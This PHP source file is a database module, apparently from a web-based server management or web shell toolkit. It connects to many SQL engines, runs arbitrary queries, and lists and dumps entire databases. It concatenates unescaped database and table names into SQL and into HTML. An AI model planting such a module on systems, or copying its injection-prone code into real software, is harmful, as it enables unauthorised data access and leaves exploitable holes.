<?php
$GLOBALS['module']['database']['id'] = "database";
$GLOBALS['module']['database']['title'] = "Database";
$GLOBALS['module']['database']['js_ontabselected'] = "";
$GLOBALS['module']['database']['content'] = "
<table class='boxtbl'>
<thead>
	<tr><th colspan='3'><p class='boxtitle'>Connect</p></th></tr>
</thead>
<tbody>
	<tr class='dbHostRow'><td style='width:144px' class='dbHostLbl'>Host</td><td colspan='2'><input type='text' id='dbHost' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
	<tr class='dbUserRow'><td>Username</td><td colspan='2'><input type='text' id='dbUser' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
	<tr class='dbPassRow'><td>Password</td><td colspan='2'><input type='text' id='dbPass' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
	<tr class='dbPortRow'><td>Port (Optional)</td><td colspan='2'><input type='text' id='dbPort' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
</tbody>
<tfoot>
	<tr class='dbConnectRow'>
		<td style='width:144px;'>
			<select id='dbType'>
			</select>
		</td>
		<td style='width:120px;'><span class='button' onclick=\"db_connect();\">connect</span></td>
		<td class='dbError'></td>
	</tr>
	<tr class='dbQueryRow' style='display:none;'>
		<td colspan='3'><textarea id='dbQuery' style='min-height:140px;height:140px;'>You can also press ctrl+enter to submit</textarea></td>
	</tr>
	<tr class='dbQueryRow' style='display:none;'>
		<td style='width:120px;'><span class='button' onclick=\"db_run();\">run</span></td>
		<td style='width:120px;'><span class='button' onclick=\"db_disconnect();\">disconnect</span></td>
		<td>Separate multiple commands with a semicolon <span class='strong'>(</span> ; <span class='strong'>)</span></td>
	</tr>
</tfoot>
</table>
<div id='dbBottom' style='display:none;'>
<br>
<table class='border' style='padding:0;'><tr><td id='dbNav' class='colFit borderright' style='vertical-align:top;'></td><td id='dbResult' style='vertical-align:top;'></td></tr></table>
</div>
";

if(!function_exists('sql_connect')){
	function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli')) return new mysqli($sqlhost, $sqluser, $sqlpass);
			elseif(function_exists('mysql_connect')) return @mysql_connect($sqlhost, $sqluser, $sqlpass);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_connect')){
				$coninfo = array("UID"=>$sqluser, "PWD"=>$sqlpass);
				return @sqlsrv_connect($sqlhost,$coninfo);
			}
			elseif(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass);
		}
		elseif($sqltype == 'pgsql'){
			$hosts = explode(":", $sqlhost);
			if(count($hosts)==2){
				$host_str = "host=".$hosts[0]." port=".$hosts[1];
			}
			else $host_str = "host=".$sqlhost;
			if(function_exists('pg_connect')) return @pg_connect("$host_str user=$sqluser password=$sqlpass");
		}
		elseif($sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); }
		elseif($sqltype == 'sqlite3'){
			if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost);
			else return false;
		}
		elseif($sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); }
		elseif($sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass); }
		elseif($sqltype == 'pdo'){
			if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass);
			else return false;
		}
		return false;
	}
}

if(!function_exists('sql_query')){
	function sql_query($sqltype, $query, $con){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli')) return $con->query($query);
			elseif(function_exists('mysql_query')) return mysql_query($query);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
			elseif(function_exists('mssql_query')) return mssql_query($query);
		}
		elseif($sqltype == 'pgsql') return pg_query($query);
		elseif($sqltype == 'oracle') return oci_execute(oci_parse($con, $query));
		elseif($sqltype == 'sqlite3') return $con->query($query);
		elseif($sqltype == 'sqlite') return sqlite_query($con, $query);
		elseif($sqltype == 'odbc') return odbc_exec($con, $query);
		elseif($sqltype == 'pdo') return $con->query($query);
	}
}

if(!function_exists('sql_num_rows')){
	function sql_num_rows($sqltype,$result){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli_result')) return $result->mysqli_num_rows;
			elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
			elseif(function_exists('mssql_num_rows')) return mssql_num_rows($result);
		}
		elseif($sqltype == 'pgsql') return pg_num_rows($result);
		elseif($sqltype == 'oracle') return oci_num_rows($result);
		elseif($sqltype == 'sqlite3'){
			$metadata = $result->fetchArray();
			if(is_array($metadata)) return $metadata['count'];
		}
		elseif($sqltype == 'sqlite') return sqlite_num_rows($result);
		elseif($sqltype == 'odbc') return odbc_num_rows($result);
		elseif($sqltype == 'pdo') return $result->rowCount();
	}
}

if(!function_exists('sql_num_fields')){
	function sql_num_fields($sqltype, $result){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli_result')) return $result->field_count;
			elseif(function_exists('mysql_num_fields')) return mysql_num_fields($result);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
			elseif(function_exists('mssql_num_fields')) return mssql_num_fields($result);
		}
		elseif($sqltype == 'pgsql') return pg_num_fields($result);
		elseif($sqltype == 'oracle') return oci_num_fields($result);
		elseif($sqltype == 'sqlite3') return $result->numColumns();
		elseif($sqltype == 'sqlite') return sqlite_num_fields($result);
		elseif($sqltype == 'odbc') return odbc_num_fields($result);
		elseif($sqltype == 'pdo') return $result->columnCount();
	}
}

if(!function_exists('sql_field_name')){
	function sql_field_name($sqltype,$result,$i){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli_result')) { $z=$result->fetch_field();return $z->name;}
			elseif(function_exists('mysql_field_name')) return mysql_field_name($result,$i);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_field_metadata')){
				$metadata = sqlsrv_field_metadata($result);
				if(is_array($metadata)){
					$metadata=$metadata[$i];
				}
				if(is_array($metadata)) return $metadata['Name'];
			}
			elseif(function_exists('mssql_field_name')) return mssql_field_name($result,$i);
		}
		elseif($sqltype == 'pgsql') return pg_field_name($result,$i);
		elseif($sqltype == 'oracle') return oci_field_name($result,$i+1);
		elseif($sqltype == 'sqlite3') return $result->columnName($i);
		elseif($sqltype == 'sqlite') return sqlite_field_name($result,$i);
		elseif($sqltype == 'odbc') return odbc_field_name($result,$i+1);
		elseif($sqltype == 'pdo'){
			$res = $result->getColumnMeta($i);
			return $res['name'];
		}
	}
}

if(!function_exists('sql_fetch_data')){
	function sql_fetch_data($sqltype,$result){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli_result')) return $result->fetch_row();
			elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
			elseif(function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
		}
		elseif($sqltype == 'pgsql') return pg_fetch_row($result);
		elseif($sqltype == 'oracle') return oci_fetch_row($result);
		elseif($sqltype == 'sqlite3') return $result->fetchArray(1);
		elseif($sqltype == 'sqlite') return sqlite_fetch_array($result,1);
		elseif($sqltype == 'odbc') return odbc_fetch_array($result);
		elseif($sqltype == 'pdo') return $result->fetch(2);
	}
}

if(!function_exists('sql_close')){
	function sql_close($sqltype,$con){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli')) return $con->close();
			elseif(function_exists('mysql_close')) return mysql_close($con);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_close')) return sqlsrv_close($con);
			elseif(function_exists('mssql_close')) return mssql_close($con);
		}
		elseif($sqltype == 'pgsql') return pg_close($con);
		elseif($sqltype == 'oracle') return oci_close($con);
		elseif($sqltype == 'sqlite3') return $con->close();
		elseif($sqltype == 'sqlite') return sqlite_close($con);
		elseif($sqltype == 'odbc') return odbc_close($con);
		elseif($sqltype == 'pdo') return $con = null;
	}
}

if(!function_exists('sql_get_supported')){
	function sql_get_supported(){
		$db_supported = array();

		if(function_exists("mysql_connect")) $db_supported[] = 'mysql';
		if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $db_supported[] = 'mssql';
		if(function_exists("pg_connect")) $db_supported[] = 'pgsql';
		if(function_exists("oci_connect")) $db_supported[] = 'oracle';
		if(function_exists("sqlite_open")) $db_supported[] = 'sqlite';
		if(class_exists("SQLite3")) $db_supported[] = 'sqlite3';
		if(function_exists("odbc_connect")) $db_supported[] = 'odbc';
		if(class_exists("PDO")) $db_supported[] = 'pdo';

		return implode(",", $db_supported);
	}
}

if(!function_exists('sql_escape_string')){
	function sql_escape_string($sqltype, $str, $con){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli')) return $con->real_escape_string($str);
			elseif(function_exists('mysql_real_escape_string')) return mysql_real_escape_string($str);
		}
		elseif($sqltype == 'pgsql') return pg_escape_string($str);
		elseif($sqltype == 'sqlite3') return $con->escapeString($str);
		elseif($sqltype == 'pdo') return substr($con->quote($str), 1, -1);
		return addslashes($str);
	}
}

if(!function_exists('sql_select_db')){
	function sql_select_db($sqltype, $db, $con){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli')) return $con->select_db($db);
			elseif(function_exists('mysql_select_db')) return mysql_select_db($db);
		}
		elseif($sqltype == 'mssql'){
			return sql_query($sqltype, "USE ".$db, $con);
		}
		elseif($sqltype == 'pgsql'){
			return true;
		}
		return true;
	}
}

if(!function_exists('sql_get_table_structure')){
	function sql_get_table_structure($sqltype, $db, $table, $con){
		$res = "";
		if($sqltype == 'mysql'){
			sql_select_db($sqltype, $db, $con);
			$q = sql_query($sqltype, "DESCRIBE `".$table."`", $con);
			if($q !== false){
				$res .= "<table class='border dataView sortable tblResult'>";
				$res .= "<tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr>";
				while($row = sql_fetch_data($sqltype, $q)){
					$res .= "<tr>";
					foreach($row as $r){
						if(empty($r) && $r !== '0') $r = "&nbsp;";
						$res .= "<td>".html_safe($r)."</td>";
					}
					$res .= "</tr>";
				}
				$res .= "</table>";
				$q2 = sql_query($sqltype, "SHOW CREATE TABLE `".$table."`", $con);
				if($q2 !== false){
					$row2 = sql_fetch_data($sqltype, $q2);
					if($row2) $res .= "<pre>".html_safe($row2[1])."</pre>";
				}
			}
		}
		elseif($sqltype == 'pgsql'){
			$q = sql_query($sqltype, "SELECT column_name, data_type, is_nullable, column_default, character_maximum_length FROM information_schema.columns WHERE table_schema='".pg_escape_string($db)."' AND table_name='".pg_escape_string($table)."' ORDER BY ordinal_position", $con);
			if($q !== false){
				$res .= "<table class='border dataView sortable tblResult'>";
				$res .= "<tr><th>Column</th><th>Type</th><th>Nullable</th><th>Default</th><th>Max Length</th></tr>";
				while($row = sql_fetch_data($sqltype, $q)){
					$res .= "<tr>";
					foreach($row as $r){
						if(empty($r) && $r !== '0') $r = "&nbsp;";
						$res .= "<td>".html_safe($r)."</td>";
					}
					$res .= "</tr>";
				}
				$res .= "</table>";
			}
		}
		elseif($sqltype == 'mssql'){
			$q = sql_query($sqltype, "SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE, COLUMN_DEFAULT, CHARACTER_MAXIMUM_LENGTH FROM ".$db.".INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='".$table."'", $con);
			if($q !== false){
				$res .= "<table class='border dataView sortable tblResult'>";
				$res .= "<tr><th>Column</th><th>Type</th><th>Nullable</th><th>Default</th><th>Max Length</th></tr>";
				while($row = sql_fetch_data($sqltype, $q)){
					$res .= "<tr>";
					foreach($row as $r){
						if(empty($r) && $r !== '0') $r = "&nbsp;";
						$res .= "<td>".html_safe($r)."</td>";
					}
					$res .= "</tr>";
				}
				$res .= "</table>";
			}
		}
		elseif($sqltype == 'sqlite3' || $sqltype == 'sqlite'){
			$q = sql_query($sqltype, "PRAGMA table_info(".$table.")", $con);
			if($q !== false){
				$res .= "<table class='border dataView sortable tblResult'>";
				$res .= "<tr><th>CID</th><th>Name</th><th>Type</th><th>Not Null</th><th>Default</th><th>PK</th></tr>";
				while($row = sql_fetch_data($sqltype, $q)){
					$res .= "<tr>";
					foreach($row as $r){
						if(empty($r) && $r !== '0') $r = "&nbsp;";
						$res .= "<td>".html_safe($r)."</td>";
					}
					$res .= "</tr>";
				}
				$res .= "</table>";
				$q2 = sql_query($sqltype, "SELECT sql FROM sqlite_master WHERE type='table' AND name='".$table."'", $con);
				if($q2 !== false){
					$row2 = sql_fetch_data($sqltype, $q2);
					if($row2) $res .= "<pre>".html_safe($row2[0])."</pre>";
				}
			}
		}
		elseif($sqltype == 'oracle'){
			$q = sql_query($sqltype, "SELECT COLUMN_NAME, DATA_TYPE, NULLABLE, DATA_DEFAULT, DATA_LENGTH FROM ALL_TAB_COLUMNS WHERE OWNER='".strtoupper($db)."' AND TABLE_NAME='".strtoupper($table)."' ORDER BY COLUMN_ID", $con);
			if($q !== false){
				$res .= "<table class='border dataView sortable tblResult'>";
				$res .= "<tr><th>Column</th><th>Type</th><th>Nullable</th><th>Default</th><th>Length</th></tr>";
				while($row = sql_fetch_data($sqltype, $q)){
					$res .= "<tr>";
					foreach($row as $r){
						if(empty($r) && $r !== '0') $r = "&nbsp;";
						$res .= "<td>".html_safe($r)."</td>";
					}
					$res .= "</tr>";
				}
				$res .= "</table>";
			}
		}
		return $res;
	}
}

if(!function_exists('sql_dump_table')){
	function sql_dump_table($sqltype, $db, $table, $con){
		$dump = "";
		$dump .= "-- Dump of table: ".$table."\n";
		$dump .= "-- Date: ".date("Y-m-d H:i:s")."\n\n";

		if($sqltype == 'mysql'){
			sql_select_db($sqltype, $db, $con);
			$dump .= "DROP TABLE IF EXISTS `".$table."`;
";
			$q = sql_query($sqltype, "SHOW CREATE TABLE `".$table."`", $con);
			if($q !== false){
				$row = sql_fetch_data($sqltype, $q);
				if($row) $dump .= $row[1].";\n\n";
			}
			$q = sql_query($sqltype, "SELECT * FROM `".$table."`", $con);
			if($q !== false){
				$ncols = sql_num_fields($sqltype, $q);
				while($row = sql_fetch_data($sqltype, $q)){
					$vals = array();
					foreach($row as $v){
						if($v === null) $vals[] = "NULL";
						else $vals[] = "'".sql_escape_string($sqltype, $v, $con)."'";
					}
					$dump .= "INSERT INTO `".$table."` VALUES (".implode(", ", $vals).");\n";
				}
			}
		}
		elseif($sqltype == 'pgsql'){
			$dump .= "DROP TABLE IF EXISTS \"".$db."\".\"".$table."\";\n";
			$q = sql_query($sqltype, "SELECT column_name, data_type, is_nullable, column_default FROM information_schema.columns WHERE table_schema='".pg_escape_string($db)."' AND table_name='".pg_escape_string($table)."' ORDER BY ordinal_position", $con);
			if($q !== false){
				$cols = array();
				while($row = pg_fetch_assoc($q)){
					$coldef = '"'.$row['column_name'].'" '.$row['data_type'];
					if($row['is_nullable'] == 'NO') $coldef .= ' NOT NULL';
					if(!empty($row['column_default'])) $coldef .= ' DEFAULT '.$row['column_default'];
					$cols[] = $coldef;
				}
				$dump .= "CREATE TABLE \"".$db."\".\"".$table."\" (\n  ".implode(",\n  ", $cols)."\n);\n\n";
			}
			$q = sql_query($sqltype, "SELECT * FROM \"".$db."\".\"".$table."\"", $con);
			if($q !== false){
				while($row = pg_fetch_row($q)){
					$vals = array();
					foreach($row as $v){
						if($v === null) $vals[] = "NULL";
						else $vals[] = "'".pg_escape_string($v)."'";
					}
					$dump .= "INSERT INTO \"".$db."\".\"".$table."\" VALUES (".implode(", ", $vals).");\n";
				}
			}
		}
		elseif($sqltype == 'sqlite3'){
			$q = sql_query($sqltype, "SELECT sql FROM sqlite_master WHERE type='table' AND name='".$con->escapeString($table)."'", $con);
			if($q !== false){
				$row = $q->fetchArray(1);
				if($row){
					$dump .= "DROP TABLE IF EXISTS \"".$table."\";\n";
					$dump .= $row[0].";\n\n";
				}
			}
			$q = sql_query($sqltype, "SELECT * FROM \"".$table."\"", $con);
			if($q !== false){
				while($row = $q->fetchArray(1)){
					$vals = array();
					foreach($row as $v){
						if($v === null) $vals[] = "NULL";
						else $vals[] = "'".$con->escapeString($v)."'";
					}
					$dump .= "INSERT INTO \"".$table."\" VALUES (".implode(", ", $vals).");\n";
				}
			}
		}
		elseif($sqltype == 'sqlite'){
			$q = sql_query($sqltype, "SELECT sql FROM sqlite_master WHERE type='table' AND name='".$table."'", $con);
			if($q !== false){
				$row = sqlite_fetch_array($q, 1);
				if($row){
					$dump .= "DROP TABLE IF EXISTS \"".$table."\";\n";
					$dump .= $row[0].";\n\n";
				}
			}
			$q = sql_query($sqltype, "SELECT * FROM \"".$table."\"", $con);
			if($q !== false){
				while($row = sqlite_fetch_array($q, 1)){
					$vals = array();
					foreach($row as $v){
						if($v === null) $vals[] = "NULL";
						else $vals[] = "'".sqlite_escape_string($v)."'";
					}
					$dump .= "INSERT INTO \"".$table."\" VALUES (".implode(", ", $vals).");\n";
				}
			}
		}
		elseif($sqltype == 'mssql'){
			$dump .= "-- MSSQL dump (structure + data)\n";
			$dump .= "IF OBJECT_ID('".$db."..".$table."', 'U') IS NOT NULL DROP TABLE ".$db."..".$table.";\nGO\n";
			$q = sql_query($sqltype, "SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, IS_NULLABLE FROM ".$db.".INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='".$table."' ORDER BY ORDINAL_POSITION", $con);
			if($q !== false){
				$cols = array();
				while($row = sql_fetch_data($sqltype, $q)){
					$coldef = "[".$row[0]."] ".$row[1];
					if(!empty($row[2]) && $row[2] != '-1') $coldef .= "(".$row[2].")";
					elseif($row[2] == '-1') $coldef .= "(MAX)";
					if($row[3] == 'NO') $coldef .= " NOT NULL";
					$cols[] = $coldef;
				}
				$dump .= "CREATE TABLE ".$db."..".$table." (\n  ".implode(",\n  ", $cols)."\n);\nGO\n\n";
			}
			$q = sql_query($sqltype, "SELECT * FROM ".$db."..".$table, $con);
			if($q !== false){
				while($row = sql_fetch_data($sqltype, $q)){
					$vals = array();
					foreach($row as $v){
						if($v === null) $vals[] = "NULL";
						else $vals[] = "'".str_replace("'","''",$v)."'";
					}
					$dump .= "INSERT INTO ".$db."..".$table." VALUES (".implode(", ", $vals).");\n";
				}
				$dump .= "GO\n";
			}
		}
		elseif($sqltype == 'oracle'){
			$dump .= "-- Oracle dump (data only)\n";
			$q = sql_query($sqltype, "SELECT * FROM ".$db.".".$table, $con);
			if($q !== false){
				$ncols = oci_num_fields($q);
				while($row = oci_fetch_row($q)){
					$vals = array();
					foreach($row as $v){
						if($v === null) $vals[] = "NULL";
						else $vals[] = "'".str_replace("'","''",$v)."'";
					}
					$dump .= "INSERT INTO ".$db.".".$table." VALUES (".implode(", ", $vals).");\n";
				}
			}
		}
		$dump .= "\n";
		return $dump;
	}
}

if(!function_exists('sql_dump_database')){
	function sql_dump_database($sqltype, $db, $con){
		$dump = "-- Database dump: ".$db."\n";
		$dump .= "-- Generated: ".date("Y-m-d H:i:s")."\n";
		$dump .= "-- Engine: ".$sqltype."\n";
		$dump .= "-- ----------------------------------------\n\n";

		$tables = array();
		if($sqltype == 'mysql'){
			sql_select_db($sqltype, $db, $con);
			$q = sql_query($sqltype, "SHOW TABLES FROM `".$db."`", $con);
		}
		elseif($sqltype == 'mssql') $q = sql_query($sqltype, "SELECT name FROM ".$db."..sysobjects WHERE xtype = 'U'", $con);
		elseif($sqltype == 'pgsql') $q = sql_query($sqltype, "SELECT table_name FROM information_schema.tables WHERE table_schema='".pg_escape_string($db)."'", $con);
		elseif($sqltype == 'oracle') $q = sql_query($sqltype, "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".strtoupper($db)."'", $con);
		elseif($sqltype == 'sqlite3' || $sqltype == 'sqlite') $q = sql_query($sqltype, "SELECT name FROM sqlite_master WHERE type='table'", $con);
		else return $dump."-- Dump not supported for this driver\n";

		if($q !== false){
			while($row = sql_fetch_data($sqltype, $q)){
				if(isset($row[0])) $tables[] = $row[0];
			}
		}

		foreach($tables as $tbl){
			$dump .= sql_dump_table($sqltype, $db, $tbl, $con);
		}

		return $dump;
	}
}

if(isset($p['dbGetSupported'])){
	$res = sql_get_supported();
	if(empty($res)) $res = "error";
	output($res);
}
elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['dbPass'])&&isset($p['dbPort'])){
	$type = $p['dbType'];
	$host = $p['dbHost'];
	$user = $p['dbUser'];
	$pass = $p['dbPass'];
	$port = $p['dbPort'];

	$con = sql_connect($type ,$host , $user , $pass);
	$res = "";

	if($con!==false){

		if(isset($p['dbDump'])){
			$db = trim($p['dbDump']);
			$table = isset($p['dbDumpTable']) ? trim($p['dbDumpTable']) : '';
			if(!empty($table)){
				$dump = sql_dump_table($type, $db, $table, $con);
			} else {
				$dump = sql_dump_database($type, $db, $con);
			}
			output($dump);
		}
		elseif(isset($p['dbStructure'])){
			$db = trim($p['dbStructure']);
			$table = trim($p['dbStructureTable']);
			$res = sql_get_table_structure($type, $db, $table, $con);
			if(!empty($res)){
				$res = "<p class='boxtitle' style='padding:8px;margin-bottom:8px;'>Structure: <span class='strong'>".$db."</span>.<span class='strong'>".$table."</span></p>".$res;
				output($res);
			}
			output('error');
		}
		elseif(isset($p['dbQuery'])){
			$query = $p['dbQuery'];
			$pagination = "";
			if((isset($p['dbDB']))&&(isset($p['dbTable']))){
				$db = trim($p['dbDB']);
				$table = trim($p['dbTable']);
				$start = (int) (isset($p['dbStart']))? trim($p['dbStart']):0;
				$limit = (int) (isset($p['dbLimit']))? trim($p['dbLimit']):100;

				if($type=='mysql'){
					$query = "SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$limit.";";
				}
				elseif($type=='mssql'){
					$query = "SELECT TOP ".$limit." * FROM ".$db."..".$table.";";
				}
				elseif($type=='pgsql'){
					$query = "SELECT * FROM ".$db.".".$table." LIMIT ".$limit." OFFSET ".$start.";";
				}
				elseif($type=='oracle'){
					$limit = $start + $limit;
					$query = "SELECT * FROM ".$db.".".$table." WHERE ROWNUM BETWEEN ".$start." AND ".$limit.";";
				}
				elseif($type=='sqlite' || $type=='sqlite3'){
					$query = "SELECT * FROM ".$table." LIMIT ".$start.",".$limit.";";
				}
				else $query = "";

				$pagination = "Limit <input type='text' id='dbLimit' value='".html_safe($limit)."' style='width:50px;'>
								<span class='button' onclick=\"db_pagination('prev');\">prev</span>
								<span class='button' onclick=\"db_pagination('next');\">next</span>
								<input type='hidden' id='dbDB' value='".html_safe($db)."'>
								<input type='hidden' id='dbTable' value='".html_safe($table)."'>
								<input type='hidden' id='dbStart' value='".html_safe($start)."'>
								";
			}

			$querys = explode(";", $query);
			foreach($querys as $query){
				if(trim($query) != ""){
					$query_query = sql_query($type, $query, $con);
					if($query_query!=false){
						$res .= "<p>".html_safe($query).";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> ok <span class='strong'>]</span></p>";
						if(!empty($pagination)){
							$res .= "<p>".$pagination."</p>";
						}
						if(!is_bool($query_query)){
							$res .= "<table class='border dataView sortable tblResult'><tr>";
							for($i = 0; $i < sql_num_fields($type, $query_query); $i++)
								$res .= "<th>".html_safe(sql_field_name($type, $query_query, $i))."</th>";
							$res .= "</tr>";
							while($rows = sql_fetch_data($type, $query_query)){
								$res .= "<tr>";
								foreach($rows as $r){
									if(empty($r)) $r = " ";
									$res .= "<td>".html_safe($r)."</td>";
								}
								$res .= "</tr>";
							}
							$res .= "</table>";
						}
					}
					else{
						$res .= "<p>".html_safe($query).";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> error <span class='strong'>]</span></p>";
					}
				}
			}
		}
		else{
			if(($type!='pdo') && ($type!='odbc')){
				if($type=='mysql') $showdb = "SHOW DATABASES";
				elseif($type=='mssql') $showdb = "SELECT name FROM master..sysdatabases";
				elseif($type=='pgsql') $showdb = "SELECT schema_name FROM information_schema.schemata";
				elseif($type=='oracle') $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
				elseif(($type=='sqlite3') || ($type=='sqlite')) $showdb = "SELECT \"".$host."\"";
				else $showdb = "SHOW DATABASES";

				$query_db = sql_query($type, $showdb, $con);

				if($query_db!=false) {
					while($db_arr = sql_fetch_data($type, $query_db)){
						foreach($db_arr as $db){
							if($type=='mysql') $showtbl = "SHOW TABLES FROM ".$db;
							elseif($type=='mssql') $showtbl = "SELECT name FROM ".$db."..sysobjects WHERE xtype = 'U'";
							elseif($type=='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$db."'";
							elseif($type=='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$db."'";
							elseif(($type=='sqlite3') || ($type=='sqlite')) $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
							else $showtbl = "";

							$res .= "<p class='boxtitle boxNav' style='padding:8px 32px;margin-bottom:4px;'>".$db." <span class='button' style='float:right;min-width:60px;width:60px;padding:4px;font-size:11px;' onclick=\"db_dump_db('".$db."');\">dump</span></p><table class='border' style='display:none;margin:8px 0;'>";
							$query_table = sql_query($type, $showtbl, $con);

							if($query_table!=false){
								while($tables_arr = sql_fetch_data($type, $query_table)){
									foreach($tables_arr as $table) $res .= "<tr><td class='dbTable borderbottom' style='cursor:pointer;'>".$table."</td><td class='borderbottom' style='width:50px;text-align:center;'><span class='dbStructBtn' style='cursor:pointer;color:#d4af37;' data-db='".$db."' data-table='".$table."' title='Structure'>S</span> <span class='dbDumpBtn' style='cursor:pointer;color:#cc0000;' data-db='".$db."' data-table='".$table."' title='Dump'>D</span></td></tr>";
								}
							}
							$res .= "</table>";
						}
					}
				}
			}
		}
	}
	if(!empty($res)) output($res);
	output('error');
}

?>